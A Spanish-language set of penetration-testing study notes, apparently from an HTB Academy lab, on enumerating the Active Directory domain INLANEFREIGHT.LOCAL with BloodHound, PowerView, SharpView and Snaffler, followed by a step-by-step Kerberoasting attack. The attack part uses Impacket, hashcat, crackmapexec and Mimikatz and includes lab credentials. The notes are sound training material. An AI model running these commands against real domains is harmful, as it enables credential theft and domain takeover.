```shell-session
amr251@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
...SNIP...
```

El comando ejecutó Bloodhound.py con el usuario **forend**, indicando el controlador de dominio como servidor DNS (`-ns`) y el dominio INLANEFREIGHT.LOCAL (`-d`), además de la opción `-c all` para realizar todas las comprobaciones. Al completarse, generará en el directorio actual archivos JSON nombrados según la fecha.

##### Subiendo el zip generado en BloodHound GUI

Instalar BloodHound es una tortura, así que para simplificar el proceso, simplemente tiramos de la imagen oficial de Docker y seguimos 3 sencillos pasos:

Paso 1: Descargar la imagen oficial:

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
```

Paso 2: Descomprimir y dar permisos de ejecución:

```bash
tar -xzf bloodhound-cli-linux-amd64.tar.gz
chmod +x bloodhound-cli
```

Paso 3: Instalar la imagen de docker y desplegar:

```bash
./bloodhound-cli install
...SNIP...
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: 9VXtaWqNRb6Gv7w60XaFSO8cl65vRUyK
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ponemos esa contraseña, y nos pedirá una nueva. Por dejarlo como estándar, se usará en Bloodhound la siguiente: `Admin!12345#`. Bien, desde el equipo donde tenemos acceso al DC, ejecutamos el comando que está arriba para obtener los archivos JSON correspondientes. Tras generarlos, creamos un .zip con ellos y lo subimos a BloodHound, justo en 'Upload File(s)', y esperamos a que termine de analizar. 

![[Bloodhound1.png]]

La consulta “Find Shortest Paths To Domain Admins” traza relaciones entre usuarios, grupos, hosts, ACLs y GPOs para identificar posibles rutas de escalada hasta privilegios de dominio, lo que guía nuestro movimiento lateral. Tras cargar los JSON, explora las pestañas Database Info, Node Info y Analysis—con sus consultas predefinidas—y prueba consultas Cypher personalizadas. Ajusta en Settings la vista de nodos y bordes o activa el modo oscuro. Más adelante veremos SharpHound en Windows y cómo aprovechar esos datos en la GUI de BloodHound antes de pasar a otras herramientas desde un host Windows en INLANEFREIGHT.LOCAL.

# Enumeración con credenciales - Windows

### Active Directory PowerShell Module

El módulo **ActiveDirectory** de PowerShell es un conjunto de cmdlets para administrar un entorno de Active Directory desde la línea de comandos. En el momento de redactar esto, consta de 147 cmdlets distintos. No podemos cubrirlos todos aquí, pero veremos algunos especialmente útiles para la enumeración de entornos AD. Siéntete libre de explorar otros cmdlets del módulo en el laboratorio de esta sección y descubrir qué combinaciones y salidas interesantes puedes generar.

Antes de usar el módulo, debes asegurarte de importarlo. El cmdlet `Get-Module`, que forma parte del módulo **Microsoft.PowerShell.Core**, lista todos los módulos disponibles, su versión y los comandos que proporcionan. Es una forma excelente de comprobar si hay herramientas como Git o scripts administrativos personalizados ya instalados. Si el módulo **ActiveDirectory** no está cargado, ejecuta:

```
Import-Module ActiveDirectory
```

##### Descubrir módulos e importar el módulo de AD

```powershell-session
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS... 
```

Ahora que nuestros módulos han cargado, podemos comenzar. Primero iniciaremos información básica sobre el dominio con el cmdlet `ADDomain`.

##### Obtener información del dominio

```powershell-session
PS C:\htb> Get-ADDomain
...SNIP...
```

Esto mostrará información útil como el SID del dominio, el nivel funcional del dominio, posibles dominios hijos y más. A continuación, usaremos el cmdlet `Get-ADUser`, filtrando las cuentas que tengan poblada la propiedad `ServicePrincipalName`. Así obtendremos un listado de cuentas que podrían ser susceptibles a un ataque de Kerberoasting, tema que veremos en detalle después de la siguiente sección.

##### Get-ADUser

```powershell-session
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
...SNIP...
```

Otro checkeo interesante que podemos lanzar usando el módulo de AD sería verificar relaciones de confianza usando el siguiente cmdlet:

##### Comprobando relaciones de confianza

```powershell-session
PS C:\htb> Get-ADTrust -Filter *
...SNIP...
```

Este cmdlet mostrará cualquier relación de confianza que tenga el dominio. Podremos saber si son confianzas dentro de nuestro bosque o con dominios de otros bosques, el tipo de confianza, la dirección de la misma y el nombre del dominio con el que existe la relación. Esto será útil más adelante para aprovechar confianzas de hijo a padre y atacar a través de confianzas entre bosques. A continuación, podemos recopilar información de los grupos de AD usando el cmdlet `Get-ADGroup`.

```powershell-session
PS C:\htb> Get-ADGroup -Filter * | select name

name
----
Administrators
Users
...SNIP...
```

##### Información detallada de grupo

```powershell-session
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

Ahora que sabemos más sobre el grupo, obtengamos la lista de miembros usando el cmdlet `Get-ADGroupMember`.

##### Membresía de grupo

```powershell-session
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
```

Hemos identificado que la cuenta **backupagent** forma parte de **Backup Operators**, lo cual conviene anotar porque, si llegásemos a comprometer ese servicio, podríamos escalar privilegios en el dominio. Repetir este proceso manualmente para cada grupo resulta tedioso y genera ingentes volúmenes de datos; por eso herramientas como BloodHound agilizan y organizan mucho este trabajo. Aunque el módulo ActiveDirectory de PowerShell ofrece una forma más discreta de enumerar sin desplegar executables externos, a continuación veremos cómo PowerView simplifica aún más la exploración profunda del dominio.

### PowerView

PowerView es un módulo de PowerShell que, al igual que BloodHound, nos permite mapear el entorno AD: detectar sesiones de usuarios, enumerar usuarios, equipos, grupos, ACLs y trusts, descubrir recursos compartidos y contraseñas, y realizar Kerberoasting, entre otras funciones. Aunque exige más trabajo manual para encontrar configuraciones erróneas, su versatilidad ofrece información valiosa sobre la seguridad del dominio cuando se usa correctamente.

##### Comandos Generales

| Comando                   | Descripción                                                                                            |
|---------------------------|--------------------------------------------------------------------------------------------------------|
| `Export-PowerViewCSV`     | Añade resultados a un archivo CSV                                                                      |
| `ConvertTo-SID`           | Convierte un nombre de usuario o grupo a su valor SID                                                  |
| `Get-DomainSPNTicket`     | Solicita el ticket Kerberos para una cuenta con un SPN (Service Principal Name) especificado           |

##### Funciones de Dominio / LDAP

| Comando                     | Descripción                                                                                            |
| --------------------------- | ------------------------------------------------------------------------------------------------------ |
| `Get-Domain`                | Devuelve el objeto AD del dominio actual (o uno especificado)                                          |
| `Get-DomainController`      | Lista los Controladores de Dominio del dominio especificado                                            |
| `Get-DomainUser`            | Devuelve todos los usuarios o usuarios específicos en AD                                               |
| `Get-DomainComputer`        | Devuelve todos los equipos o equipos específicos en AD                                                 |
| `Get-DomainGroup`           | Devuelve todos los grupos o grupos específicos en AD                                                   |
| `Get-DomainOU`              | Busca todas las Unidades Organizativas (OU) o OU específicas en AD                                     |
| `Find-InterestingDomainAcl` | Encuentra ACLs de objetos en el dominio con derechos de modificación delegados a objetos no integrados |
| `Get-DomainGroupMember`     | Devuelve los miembros de un grupo de dominio específico                                                |
| `Get-DomainFileServer`      | Lista los servidores que probablemente funcionan como servidores de archivos                           |
| `Get-DomainDFSShare`        | Lista todos los sistemas de archivos distribuidos (DFS) para el dominio actual (o uno especificado)    |

##### Funciones de GPO

| Comando            | Descripción                                                                  |
| ------------------ | ---------------------------------------------------------------------------- |
| `Get-DomainGPO`    | Devuelve todas las GPO o GPO específicas en AD                               |
| `Get-DomainPolicy` | Devuelve la política predeterminada de dominio o la política del controlador |

##### Funciones de Enumeración de Equipos

| Comando                   | Descripción                                                                         |
| ------------------------- | ----------------------------------------------------------------------------------- |
| `Get-NetLocalGroup`       | Enumera los grupos locales en el equipo local o remoto                              |
| `Get-NetLocalGroupMember` | Enumera los miembros de un grupo local específico                                   |
| `Get-NetShare`            | Muestra los recursos compartidos abiertos en el equipo local o remoto               |
| `Get-NetSession`          | Devuelve información de sesiones en el equipo local o remoto                        |
| `Test-AdminAccess`        | Comprueba si el usuario actual tiene acceso administrativo al equipo local o remoto |

##### 'Meta'-Funciones Hilo-basadas

| Comando                            | Descripción                                                                          |
|------------------------------------|--------------------------------------------------------------------------------------|
| `Find-DomainUserLocation`          | Encuentra equipos donde usuarios específicos tienen sesión activa                   |
| `Find-DomainShare`                 | Encuentra recursos compartidos accesibles en equipos del dominio                     |
| `Find-InterestingDomainShareFile`  | Busca archivos que cumplan criterios en recursos compartidos legibles del dominio    |
| `Find-LocalAdminAccess`            | Encuentra equipos del dominio donde el usuario actual tiene acceso como administrador local |

##### Funciones de Confianza de Dominio

| Comando                          | Descripción                                                                                  |
|----------------------------------|----------------------------------------------------------------------------------------------|
| `Get-DomainTrust`                | Devuelve las relaciones de confianza del dominio actual o uno especificado                   |
| `Get-ForestTrust`                | Devuelve todas las confianzas de bosque del bosque actual o uno especificado                 |
| `Get-DomainForeignUser`          | Enumera usuarios que pertenecen a grupos fuera de su dominio                                  |
| `Get-DomainForeignGroupMember`   | Enumera grupos con miembros de otros dominios y lista dichos miembros                         |
| `Get-DomainTrustMapping`         | Enumera todas las confianzas observadas para el dominio actual y otros relacionados          |

Esta tabla no abarca todas las funcionalidades de PowerView, pero incluye muchas de las que usaremos de forma recurrente. Para más información sobre PowerView, consulta el módulo Active Directory PowerView. A continuación, experimentaremos con algunas de ellas.

Primero tenemos la función **Get-DomainUser**. Esta nos proporciona información de todos los usuarios o de aquellos específicos que indiquemos. A continuación la usaremos para obtener datos de un usuario concreto, **mmorgan**.

##### Información de usuario de dominio

```powershell-session
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Ahora que hemos visto información básica de usuarios con PowerView, vamos a enumerar datos de grupos de dominio. Usaremos la función **Get-DomainGroupMember** para obtener información de un grupo específico. Al añadir el parámetro `-Recurse`, indicamos a PowerView que, si encuentra otros grupos dentro del grupo objetivo (membresías anidadas), liste también a los miembros de esos grupos.

Por ejemplo, la salida mostrará que el grupo **Secadmins** forma parte de **Domain Admins** mediante membresía anidada, y así podremos ver todos los usuarios que heredan privilegios de administrador de dominio a través de esa pertenencia.

##### Membresía de grupo recursiva

```powershell-session
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
...SNIP...
```

Arriba realizamos una exploración recursiva del grupo **Domain Admins** para listar sus miembros. Ahora sabemos a quién dirigirnos para intentar una elevación de privilegios. Al igual que con el módulo de PowerShell de AD, también podemos enumerar los mapeos de confianza de dominio.

##### Enumeración de confianza

```powershell-session
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
```

Podemos utilizar la función [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/) para probar acceso como administrador local en la máquina actual o una remota

```powershell-session
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True 
```

Arriba determinamos que el usuario que estamos usando actualmente es administrador en el host **ACADEMY-EA-MS01**. Podemos realizar la misma comprobación en cada equipo para ver dónde disponemos de acceso administrativo. Más adelante veremos cómo BloodHound automatiza este tipo de verificación. Ahora podemos buscar usuarios con el atributo **ServicePrincipalName** configurado, lo cual indica que la cuenta podría ser objetivo de un ataque Kerberoasting.

##### Buscando usuarios con SPN activo

```powershell-session
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2
```

### SharpView

PowerView, aunque parte del obsoleto PowerSploit, sigue vivo gracias a BC-Security dentro de Empire 4, ofreciendo funciones mejoradas (como `Get-NetGmsa`) y compatibilidad con redes AD modernas. SharpView es su equivalente en .NET: un port que mantiene la mayoría de las mismas capacidades y permite ver la ayuda de cada método con `-Help`. Ambas versiones merecen explorarse para comparar sus matices y ventajas.

```powershell-session
PS C:\htb> .\SharpView.exe Get-DomainUser -Help
```

Aquí podemos usar SharpView para obtener información sobre un usuario concreto, como el usuario **forend**, sobre el que tenemos control.

```powershell-session
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIG
```

### Unidades compartidas

Las unidades compartidas de dominio facilitan el acceso a recursos, pero si sus permisos son demasiado amplios pueden exponer datos sensibles (por ejemplo, configuraciones, claves SSH o contraseñas). Un atacante con un usuario estándar capaz de acceder a shares como los de TI podría filtrar información crítica. Debemos verificar que las carpetas compartidas exijan autenticación de dominio y privilegios adecuados, y cumplir normativas como HIPAA o PCI. Herramientas como PowerView permiten buscar shares y explorarlas, aunque puede ser tedioso; Snaffler nos ayudará a automatizar y agilizar esta detección de manera más precisa.

### Snaffler

Snaffler es una herramienta que, desde un equipo unido al dominio o con un contexto de usuario de dominio, obtiene la lista de hosts del dominio, enumera sus recursos compartidos y directorios accesibles, y busca en ellos ficheros que contengan credenciales u otra información sensible para mejorar nuestra posición en la evaluación.

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

Los parámetros de Snaffler funcionan así:

- `-s`: muestra los resultados por consola.    
- `-d`: especifica el dominio en el que se va a buscar.    
- `-o`: indica el fichero de salida donde se guardarán los resultados.    
- `-v`: ajusta el nivel de verbosidad.    

Normalmente se recomienda usar el nivel `data`, ya que solo muestra directamente los hallazgos en pantalla y facilita revisar la salida inicial. Dado que Snaffler puede generar gran cantidad de información, es habitual redirigir toda la salida a un fichero y analizarlo después con calma. Además, proporcionar el fichero bruto al cliente como dato suplementario puede ayudarle a identificar rápidamente qué recursos compartidos de alto valor deberían protegerse primero.

```powershell-session
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler
```

Con Snaffler podemos extraer contraseñas, claves SSH, archivos de configuración y otros datos valiosos, con salida coloreada y categorización de tipos de ficheros. Con toda esa información recopilada de INLANEFREIGHT.LOCAL, BloodHound nos permitirá correlarla y visualizar rutas de ataque de forma efectiva.

### BloodHound

BloodHound es una herramienta de código abierto que, analizando las relaciones entre objetos de AD, identifica rutas de ataque complejas y de alto impacto. Tanto pentesters como defensores pueden aprovecharla para visualizar vulnerabilidades difíciles de detectar. Para usarla, basta con autenticarse como usuario de dominio desde un host Windows (no necesariamente unido al dominio) o transferir SharpHound.exe a un equipo unido. Una vez en el host, con `SharpHound.exe --help` se accede a todas las opciones disponibles para ejecutar la recolección de datos.

Empezaremos ejecutando `SharpHound.exe` desde el host de ataque MS01

```powershell-session
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT

2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022
...SNIP...
```

Tras generar el ZIP con los JSON de SharpHound, lo subes en MS01 ejecutando `bloodhound` y, si pide credenciales, usas `neo4j:HTB_@cademy_stdnt!`. Luego, en la GUI, buscas el dominio `INLANEFREIGHT.LOCAL` y exploras la pestaña Database Info. En Analysis, la consulta “Find Computers with Unsupported Operating Systems” te muestra hosts con SO obsoletos (por ejemplo, Windows 7 o Server 2008), que suelen ser vulnerables y críticos. Antes de incluirlos en el informe, verifica si siguen activos; si no pueden retirarse aún, recomienda segmentarlos y planificar su reemplazo.

##### SO no soportados

![[AD_BloodHound_exe.png | 800]]

En muchos entornos detectamos usuarios con derechos de administrador local en sus equipos —ya sea por permiso temporal nunca revocado o por su rol— e incluso casos extremos como el grupo **Domain Users** con admin local en varios hosts. Con la consulta **Find Computers where Domain Users are Local Admin** identificamos rápidamente estos equipos, lo que significa que cualquier cuenta de dominio podría acceder y extraer credenciales o datos sensibles de esos sistemas.

# Kerberoasting

> Nuestra enumeración hasta este punto nos ha proporcionado una visión general del dominio y de posibles problemas. Hemos listado las cuentas de usuario y podemos ver que algunas están configuradas con Service Principal Names. Veamos cómo podemos aprovechar esto para movernos lateralmente y escalar privilegios en el dominio objetivo.

Kerberoasting es una técnica de movimiento lateral y escalada de privilegios en AD que aprovecha cuentas de servicio con SPN. Cualquier usuario de dominio puede solicitar un ticket Kerberos para esas cuentas; ese ticket (TGS-REP) va cifrado con el hash NTLM de la cuenta de servicio, de modo que, tras capturarlo, se puede atacar offline (p. ej. con Hashcat) para recuperar la contraseña en claro. Como las cuentas de servicio suelen tener contraseñas débiles o reutilizadas y, a menudo, privilegios elevados (local admins o miembros de Domain Admins), descifrar una sola puede dar acceso de administrador en múltiples servidores o al propio dominio. Incluso si el usuario no es privilegiado, el ticket descifrado permite emitir nuevos tickets de servicio (p. ej. para MSSQL/SRV01) y ejecutar código en ese contexto.

### Realizando el ataque

Dependiendo de nuestra posición en la red, este ataque puede llevarse a cabo de varias formas:

- Desde un host Linux no unido al dominio usando credenciales válidas de usuario de dominio.    
- Desde un host Linux unido al dominio como root, tras obtener el archivo keytab.    
- Desde un host Windows unido al dominio, autenticados como usuario de dominio.    
- Desde un host Windows unido al dominio con una shell en el contexto de una cuenta de dominio.    
- Como SYSTEM en un host Windows unido al dominio.    
- Desde un host Windows no unido al dominio usando `runas /netonly`.    

Se pueden emplear diversas herramientas para realizar el ataque:
- `GetUserSPNs.py` de Impacket, desde un host Linux no unido al dominio.    
- Una combinación de la utilidad integrada `setspn.exe`, PowerShell y Mimikatz en Windows.    
- En Windows, usando herramientas como PowerView, Rubeus y otros scripts de PowerShell.    

Obtener un ticket TGS mediante Kerberoasting no garantiza credenciales válidas: el ticket debe romperse offline (por ejemplo, con Hashcat) para recuperar la contraseña en claro. Los tickets TGS tardan más en crackearse que otros formatos como hashes NTLM, por lo que, salvo que la contraseña sea débil, puede ser difícil o imposible obtenerla en claro con un rig de cracking estándar. Kerberoasting puede dar acceso inmediato a cuentas privilegiadas si rompemos un ticket TGS débil, pero no siempre funciona: a veces solo obtenemos tickets que no llevan a usuarios con privilegios y no ganamos nada. En esos casos, el hallazgo se reporta como riesgo medio (para advertir del peligro de SPN débiles), mientras que si conseguimos acceso de administrador de dominio se reportaría como riesgo alto. Es clave matizar en el informe cómo influyen factores como la fortaleza de las contraseñas al evaluar el nivel de riesgo.
## Kerberoasting - Desde Linux

Para acontecer kerberoasting desde Linux usaremos herramientas del módulo de `impacket`. Empezamos listando todos los SPN del dominio usando credenciales válidas (contraseña, hash o ticket) y la IP de un DC. El comando mostrará un listado ordenado de cuentas con SPN, de las cuales varias pueden pertenecer a **Domain Admins**. Romper el ticket de cualquiera de ellas podría comprometer el dominio, por lo que conviene revisar siempre la membresía de grupo en busca de tickets fáciles de crackear que faciliten el movimiento lateral o escalada de privilegios.

##### Listando cuentas SPN con `GetUserSPNs.py`

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
...SNIP...
```

Podemos ahora traernos todos los tickets TGS para procesamiento offline usando el flag `-request`. Los tickets TGS serán puestos en un formato que pueden estar listos para adivinarlos con John o Hashcat

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

...SNIP...

$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790...
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993d...
```

Podemos incluso ser más específicos y solicitar solo el ticket TGS para una cuenta específica. Por ejemplo, para la cuenta `sqldev`:

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Con este ticket en mano, podríamos intentar adivinar la contraseña usando hashcat. Si tenemos éxito, puede que obtengamos permisos de administrador de dominio. Para facilitar el cracking offline, se recomienda utilizar el flag `-outputfile` para escribir los tickets TGS en un archivo que podamos usar directamente con Hashcat.

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

##### Crackeando el ticket offline con Hashcat

Una vez tengamos el ticket obtenido, intentamos adivinarlo con hashcar usando el módulo `13100`

```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

Tras esperar un poco, obtenemos la contraseña en claro. Como último paso, podemos confirmar nuestro acceso y comprobar que, de hecho, tenemos privilegios de Administrador de Dominio al poder autenticarnos al DC en el dominio. Desde aquí podríamos realizar post-explotación y continuar enumerando el dominio para otras rutas a comprometer, así como fallos en configuración u otros problemas.

```bash
$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!
```

## Kerberoasting - Desde Windows

Antes de que existieran herramientas como Rubeus, robar o forjar tickets Kerberos era un proceso manual y complejo. A medida que las tácticas y las defensas han evolucionado, ahora podemos realizar Kerberoasting desde Windows de varias formas. Para iniciar este proceso, exploraremos primero la vía manual y luego pasaremos a herramientas más automatizadas. Comencemos con el binario integrado **setspn** para enumerar los SPN en el dominio.

##### Enumerando SPNs con setspn.exe

> ***SPN** significa Service Principal Name o Nombre de Entidad de Servicio*

```cmd-session
C:\htb> setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

<SNIP>

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local

Existing SPN found!
```

Observaremos que la herramienta devuelve numerosos SPN distintos para los distintos hosts del dominio. Nos centraremos en las cuentas de usuario e ignoraremos las cuentas de equipo que aparezcan. A continuación, desde PowerShell podemos solicitar tickets TGS para una cuenta en la consola anterior y cargarlos en memoria. Una vez allí, los extraeremos con Mimikatz.

##### Apuntando a un usuario

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Antes de continuar, analicemos los comandos anteriores para entender qué hacen (que es básicamente lo que emplea Rubeus en su método Kerberoasting por defecto):

1. **Add-Type**  
    Agrega una clase del .NET Framework a nuestra sesión de PowerShell, de modo que luego podamos instanciarla como cualquier otro objeto de .NET.    
2. **-AssemblyName**  
    Con este parámetro le indicamos a `Add-Type` el ensamblado (.dll) que contiene los tipos (clases) que queremos usar.    
3. **System.IdentityModel**  
    Es un namespace que incluye varias clases para construir servicios de tokens de seguridad.    
4. **New-Object**  
    Crea una instancia de un objeto del .NET Framework. En este caso, usaremos la clase `KerberosRequestorSecurityToken` del namespace `System.IdentityModel.Tokens`.    
5. **KerberosRequestorSecurityToken**  
    Al instanciar esta clase con el nombre del SPN, solicitamos un ticket Kerberos TGS para la cuenta objetivo en nuestra sesión de inicio de sesión actual

> **Nota:**  
> Podríamos recuperar todos los tickets con el mismo método, pero eso también incluiría los tickets de las cuentas de equipo, por lo que no es óptimo si solo nos interesan los de cuentas de usuario.

##### Obteniendo todos los tickets usando setspn.exe

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

El comando anterior combina el método explicado previamente con `setspn.exe` para solicitar tickets de todas las cuentas que tengan SPN configurados.

Ahora que los tickets están cargados en memoria, podemos usar Mimikatz para extraerlos.

##### Extrayendo los tickets en memoria con Mimikatz

Lanzamos `mimikatz.exe` y obtenemos una terminal. A partir de aquí:

```cmd-session
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
